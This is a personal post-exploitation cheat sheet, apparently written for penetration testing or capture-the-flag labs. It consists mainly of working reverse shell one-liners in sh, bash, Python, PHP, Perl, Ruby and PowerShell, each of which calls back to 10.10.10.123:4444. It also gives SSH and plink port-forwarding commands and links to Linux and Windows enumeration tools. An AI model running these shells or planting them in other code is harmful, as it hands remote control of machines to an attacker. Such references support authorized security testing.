# Post-exploitation
Tools and techniques I use for post-exploitation:
- [Reverse Shell](#reverse-shell)
  - [sh](#sh)
  - [bash](#bash)
  - [python](#python)
  - [php](#php)
  - [perl](#perl)
  - [ruby](#ruby)
  - [powershell](#powershell)
- [Port Forwarding](#port-forwarding)
- [Linux](#linux)
  - [Enumeration](#enumeration-on-linux)
  - [Privilege Escalation](#)
- [Windows](#windows)
  - [Enumeration](#enumeration-on-windows)
  - [Privilege Escalation](#)

----

## Reverse Shell

### sh
Works on Linux and FreeBSD.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.123 4444 >/tmp/f
```

### bash
```bash
bash -i >& /dev/tcp/10.10.10.123/4444 0>&1
``` 

### python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.123",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### php
```php
# One liner
php -r '$sock=fsockopen("10.10.10.123",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Reverse shell in file
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.123/4444 0>&1'");
```

### perl
```perl
perl -e 'use Socket;$i="10.10.10.123";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.123",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### powershell
```powershell
# Create a powershell script with the name reverse.ps1
function reverse_powershell {
    $client = New-Object System.Net.Sockets.TCPClient("10.10.10.123",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
}

# Execute reverse shell
powershell -ExecutionPolicy bypass -command "Import-Module reverse.ps1; reverse_powershell"
```

----

## Port Forwarding
In some cases, a root process is bound to an internal port, with which it communicates.  
If for some reason, an exploit can't run locally on the target machine, the port can be forwarded using SSH/plink.exe to your local machine.  
The exploit code can then be run on your local machine at whichever port you chose.  

### On linux
```bash
ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```

### On windows
```powershell
plink.exe <user>@<kali> -R <kali-port>:<target-IP>:<target-port>
```

### Other tools for port forwarding
- [Chisel](https://github.com/jpillora/chisel)

----

## Linux
**work in progress**

### Enumeration on linux
Automated enumeration tools:
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

----

## Windows
**work in progress**

### Enumeration on windows
Automated enumeration tools:
- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [SharpUp](https://github.com/GhostPack/SharpUp)
